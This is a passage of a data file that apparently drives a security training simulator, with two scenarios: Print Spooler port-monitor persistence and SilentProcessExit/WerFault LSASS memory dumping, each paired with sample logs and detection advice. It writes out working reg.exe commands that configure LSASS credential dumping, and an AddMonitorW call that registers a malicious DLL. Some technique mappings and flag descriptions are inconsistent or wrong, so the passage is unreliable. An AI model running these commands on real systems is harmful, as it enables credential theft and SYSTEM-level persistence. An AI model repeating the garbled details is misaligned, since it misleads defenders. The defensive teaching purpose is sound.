    title: 'Microsoft Print Spooler, Kaspersky & MITRE DFIR — Print Spooler Port Monitor & .SPL/.SHD Spool Forensics (EID 307 / 808)',
    category: 'MALWARE',
    mitreId: 'T1547.012',
    description:
      'Grounded in Microsoft PrintService Operational Logging specifications, Kaspersky Print Spooler exploitation research, and MITRE ATT&CK T1547.012: an attacker abuses the Windows Print Spooler service (spoolsv.exe running as SYSTEM) via AddMonitor / Point-and-Print driver loading or persistent Port Monitor registration, leaving forensic traces in Microsoft-Windows-PrintService/Operational EventID 316 / 808, HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors, and C:\\Windows\\System32\\spool\\PRINTERS\\*.SHD / *.SPL files.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker RPC AddMonitor Call', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'MS-RPRN \\pipe\\spoolss RPC', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'spoolsv.exe (NT AUTHORITY\\SYSTEM)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'PrintService EID 316/808 & Sysmon', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Print\\Monitors & spool\\PRINTERS', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: MS-RPRN / MS-PAR RPC Bind to \\pipe\\spoolss & Spool File Drop (.SPL / .SHD)',
        narration:
          'The attacker binds to the Print System Remote Protocol (MS-RPRN UUID 12345678-1234-abcd-ef00-0123456789ab over \\pipe\\spoolss) or drops a malicious DLL via a print job into C:\\Windows\\System32\\spool\\PRINTERS\\FP00001.SPL alongside its shadow metadata file FP00001.SHD (which stores the submitting User SID, computer name, printer name, and timestamp at offset 0x00 in SHD_HEADER).',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Persistence (T1547.012 - Boot or Logon Autostart Execution: Print Processors)',
        technicalCommands: [
          'RPC Interface: MS-RPRN (12345678-1234-abcd-ef00-0123456789ab) over \\pipe\\spoolss',
          'Spool Artifact 1: C:\\Windows\\System32\\spool\\PRINTERS\\FP00001.SPL (Raw payload stream)',
          'Spool Artifact 2: C:\\Windows\\System32\\spool\\PRINTERS\\FP00001.SHD (Shadow header magic 0x00004968 Win10/11)',
        ],
        defenseMitigation:
          'Disable the Print Spooler service (Stop-Service Spooler; Set-Service Spooler -StartupType Disabled) on all Domain Controllers and servers that do not actively host print queues.',
        logs: [
          {
            id: 'dfir-spool-1',
            timestamp: '06:18:11.090',
            source: 'Sysmon',
            severity: 'high',
            EventCode: 11,
            ProcessName: 'spoolsv.exe',
            CommandLine: 'C:\\Windows\\System32\\spoolsv.exe writing FP00001.SHD and FP00001.SPL',
            raw: 'EventID: 11 | Image: C:\\Windows\\System32\\spoolsv.exe | TargetFilename: C:\\Windows\\System32\\spool\\PRINTERS\\FP00001.SHD | HeaderSignature: 68490000 (SHD_HEADER_WIN2003_WIN10)',
            parsedFields: {
              EventID: '11 (Sysmon FileCreate)',
              SpoolShadowFile: 'C:\\Windows\\System32\\spool\\PRINTERS\\FP00001.SHD',
              SpoolDataFile: 'C:\\Windows\\System32\\spool\\PRINTERS\\FP00001.SPL',
              ShdMagicSignature: '0x00004968 (Records Submitting User & Machine Name)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Port Monitor Registration via AddMonitor & PrintService EventID 316 / 808',
        narration:
          'The attacker invokes winspool.drv!AddMonitorW (or RpcAddMonitor) to register evilmon.dll as a Print Port Monitor. This creates HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMonitor\\Driver="evilmon.dll" (Sysmon EventID 13) and logs Microsoft-Windows-PrintService/Operational EventID 316 (Printer driver added) and EventID 808 (Failed/Untrusted plug-in module load in spoolsv.exe).',
        activeNodes: ['firewall', 'target', 'ad', 'siem'],
        mitreTactic: 'Privilege Escalation (T1547.012 - Print Port Monitor Registry & EventID 808)',
        technicalCommands: [
          'AddMonitorW(NULL, 2, &monitorInfo2) -> Registers Driver="evilmon.dll"',
          'Registry Key: HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMonitor\\Driver',
          'Microsoft-Windows-PrintService/Operational EventID 808 & 316',
        ],
        defenseMitigation:
          'Enable the Microsoft-Windows-PrintService/Operational event log (which is disabled by default on Windows) and alert on EventID 316, EventID 808, and Sysmon EventID 13 modifications under Control\\Print\\Monitors or Control\\Print\\Environments\\*\\Print Processors.',
        logs: [
          {
            id: 'dfir-spool-2',
            timestamp: '06:18:12.405',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 808,
            ProcessName: 'spoolsv.exe',
            CommandLine: 'spoolsv.exe loading C:\\Windows\\System32\\evilmon.dll via Control\\Print\\Monitors\\EvilMonitor',
            raw: 'LogName: Microsoft-Windows-PrintService/Operational | EventID: 808 | PluginDllName: C:\\Windows\\System32\\evilmon.dll | Correlated Sysmon EventID 13: TargetObject=HKLM\\System\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMonitor\\Driver Details=evilmon.dll',
            parsedFields: {
              LogChannel: 'Microsoft-Windows-PrintService/Operational',
              EventID: '808 (Spooler Plug-in Load) / 316 (Driver Added)',
              RegistryPersistenceKey: 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMonitor\\Driver',
              LoadedModule: 'C:\\Windows\\System32\\evilmon.dll',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: SYSTEM DLL Load in spoolsv.exe (Sysmon EventID 7) & Child Shell Execution (Sysmon EventID 1)',
        narration:
          'Immediately upon AddMonitorW or on every subsequent OS boot, C:\\Windows\\System32\\spoolsv.exe (running as NT AUTHORITY\\SYSTEM) loads C:\\Windows\\System32\\evilmon.dll (Sysmon EventID 7 ImageLoaded) and invokes InitializePrintMonitor2, spawning a SYSTEM child process under spoolsv.exe.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1547.012 - spoolsv.exe ImageLoad & SYSTEM Child Process)',
        technicalCommands: [
          'Sysmon EventID 7 (ImageLoaded): Image=C:\\Windows\\System32\\spoolsv.exe ImageLoaded=C:\\Windows\\System32\\evilmon.dll Signed=false',
          'Sysmon EventID 1 (ProcessCreate): ParentImage=C:\\Windows\\System32\\spoolsv.exe -> Image=C:\\Windows\\System32\\cmd.exe (NT AUTHORITY\\SYSTEM)',
        ],
        defenseMitigation:
          'Alert on any unsigned DLL loaded by spoolsv.exe (Sysmon EventID 7) and any interactive shell (cmd.exe, powershell.exe, rundll32.exe) with ParentImage=C:\\Windows\\System32\\spoolsv.exe.',
        logs: [
          {
            id: 'dfir-spool-3',
            timestamp: '06:18:12.912',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 7,
            ProcessName: 'spoolsv.exe',
            CommandLine: 'C:\\Windows\\System32\\spoolsv.exe loading unsigned evilmon.dll & spawning cmd.exe',
            raw: 'EventID: 7 | Image: C:\\Windows\\System32\\spoolsv.exe | ImageLoaded: C:\\Windows\\System32\\evilmon.dll | Signed: false | Correlated EventID 1: ParentImage=C:\\Windows\\System32\\spoolsv.exe Image=C:\\Windows\\System32\\cmd.exe User=NT AUTHORITY\\SYSTEM',
            parsedFields: {
              EventID: '7 (Sysmon ImageLoaded) / 1 (Sysmon ProcessCreate)',
              HostProcess: 'C:\\Windows\\System32\\spoolsv.exe (NT AUTHORITY\\SYSTEM)',
              UnsignedModule: 'C:\\Windows\\System32\\evilmon.dll',
              ExportEntryPoint: 'InitializePrintMonitor2',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-wer-silentprocessexit-localdumps-registry-hijack',
    title: 'Microsoft WER, Mandiant & Elastic DFIR — IFEO SilentProcessExit & WerFault.exe LSASS Dump Hijack (Sysmon EID 12 / 13)',
    category: 'MALWARE',
    mitreId: 'T1546.012',
    description:
      'Grounded in Microsoft Windows Error Reporting (WER) & Image File Execution Options (IFEO) documentation, Mandiant persistence & credential access research, and MITRE ATT&CK T1546.012 / T1003.001: an attacker sets the GlobalFlag (FLG_MONITOR_SILENT_PROCESS_EXIT = 0x200) under IFEO\\lsass.exe and configures HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe with ReportingMode=2 (LOCAL_DUMP) and MonitorProcess, tricking the trusted Windows Error Reporting binary (WerFault.exe) into dumping lsass.exe memory and launching an arbitrary SYSTEM command.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Registry Modification', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'IFEO GlobalFlag (0x200)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'SilentProcessExit\\lsass.exe', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Sysmon EID 12/13 & Application', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'WerFault.exe (Trusted Dumper)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Enabling IFEO FLG_MONITOR_SILENT_PROCESS_EXIT (0x200) on lsass.exe (Sysmon EventID 13)',
        narration:
          'To avoid opening a direct suspicious handle to lsass.exe from an untrusted binary, the attacker configures HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe\\GlobalFlag = 0x00000200 (FLG_MONITOR_SILENT_PROCESS_EXIT). Sysmon EventID 13 logs the exact DWORD modification.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Persistence (T1546.012 - Event Triggered Execution: Image File Execution Options Injection)',
        technicalCommands: [
          'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe" /v GlobalFlag /t REG_DWORD /d 512 /f',
          'Flag Constant: FLG_MONITOR_SILENT_PROCESS_EXIT = 0x200 (512 decimal)',
        ],
        defenseMitigation:
          'Monitor Sysmon EventID 12 and 13 for any key creation or GlobalFlag / Debugger value modification under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\*.',
        logs: [
          {
            id: 'dfir-wer-1',
            timestamp: '03:10:04.112',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 13,
            ProcessName: 'reg.exe',
            CommandLine: 'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe" /v GlobalFlag /t REG_DWORD /d 512 /f',
            raw: 'EventID: 13 | EventType: SetValue | Image: C:\\Windows\\System32\\reg.exe | TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe\\GlobalFlag | Details: DWORD (0x00000200)',
            parsedFields: {
              EventID: '13 (Sysmon Registry Value Set)',
              TargetObject: 'HKLM\\...\\Image File Execution Options\\lsass.exe\\GlobalFlag',
              FlagValue: '0x00000200 (FLG_MONITOR_SILENT_PROCESS_EXIT)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Configuring SilentProcessExit\\lsass.exe LocalDumpFolder, DumpType=2 & MonitorProcess (Sysmon EventID 13)',
        narration:
          'Next, the attacker creates HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe and sets ReportingMode=2 (LAUNCH_NOTIFYPROCESS | LOCAL_DUMP), LocalDumpFolder="C:\\Windows\\Temp\\Dumps", DumpType=2 (Full Memory Minidump), and MonitorProcess="C:\\ProgramData\\beacon.exe".',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Credential Access (T1003.001 - SilentProcessExit LocalDumpFolder & MonitorProcess)',
        technicalCommands: [
          'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v ReportingMode /t REG_DWORD /d 2 /f',
          'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v LocalDumpFolder /t REG_SZ /d "C:\\Windows\\Temp\\Dumps" /f',
          'reg.exe add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" /v DumpType /t REG_DWORD /d 2 /f',
        ],
        defenseMitigation:
          'Alert on any registry write under HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\* or HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\LocalDumps\\*.',
        logs: [
          {
            id: 'dfir-wer-2',
            timestamp: '03:10:06.450',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 13,
            ProcessName: 'reg.exe',
            CommandLine: 'reg.exe add "...\\SilentProcessExit\\lsass.exe" /v LocalDumpFolder /d C:\\Windows\\Temp\\Dumps',
            raw: 'EventID: 13 | EventType: SetValue | TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe\\LocalDumpFolder | Details: C:\\Windows\\Temp\\Dumps | DumpType: DWORD (0x00000002 Full Dump) | MonitorProcess: C:\\ProgramData\\beacon.exe',
            parsedFields: {
              EventID: '13 (Sysmon Registry Value Set)',
              RegistryKey: 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe',
              LocalDumpFolder: 'C:\\Windows\\Temp\\Dumps',
              DumpType: '0x2 (MiniDumpWithFullMemory)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Triggering RtlReportSilentProcessExit & WerFault.exe Full LSASS Dump (Application EventID 3001)',
        narration:
          'The attacker calls ntdll.dll!RtlReportSilentProcessExit(hLsass, 0) (which only requires PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ or is triggered via CreateRemoteThread/NtTerminateProcess on a helper). The Windows Error Reporting service spawns the Microsoft-signed C:\\Windows\\System32\\WerFault.exe, which dumps lsass.exe-(PID).dmp into C:\\Windows\\Temp\\Dumps, spawns MonitorProcess, and logs Application EventID 3001 (Source: Winlogon / SilentProcessExit).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Credential Access (T1003.001 - Trusted WerFault.exe Proxy Dumping LSASS)',
        technicalCommands: [
          'ntdll!RtlReportSilentProcessExit(hProcess, 0) -> LPC message to WerSvcGroup',
          'Sysmon EventID 10: SourceImage=C:\\Windows\\System32\\WerFault.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1FFFFF',
          'Sysmon EventID 11: Image=C:\\Windows\\System32\\WerFault.exe TargetFilename=C:\\Windows\\Temp\\Dumps\\lsass.exe-(684).dmp',
        ],
        defenseMitigation:
          'Do not blindly exclude WerFault.exe or wermgr.exe from Sysmon EventID 10 (TargetImage=lsass.exe) or EventID 11 (*.dmp creation); correlate WerFault.exe LSASS access against SilentProcessExit registry keys.',
        logs: [
          {
            id: 'dfir-wer-3',
            timestamp: '03:10:09.812',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 10,
            ProcessName: 'WerFault.exe',
            CommandLine: 'C:\\Windows\\System32\\WerFault.exe -u -p 684 -s 1420 (Dumping lsass.exe via SilentProcessExit)',
            raw: 'EventID: 10 | SourceImage: C:\\Windows\\System32\\WerFault.exe | TargetImage: C:\\Windows\\System32\\lsass.exe | GrantedAccess: 0x1fffff | Correlated EventID 11: TargetFilename=C:\\Windows\\Temp\\Dumps\\lsass.exe-684.dmp | Application EventID 3001: Silent Process Exit monitored for lsass.exe',
            parsedFields: {
              EventID: '10 (ProcessAccess) + 11 (FileCreate) + 3001 (Application Log)',
              ProxyBinary: 'C:\\Windows\\System32\\WerFault.exe (Microsoft Signed)',
              TargetProcess: 'C:\\Windows\\System32\\lsass.exe',
              CreatedDumpFile: 'C:\\Windows\\Temp\\Dumps\\lsass.exe-684.dmp',
            },
          },
        ],
      },
    ],
  },
];
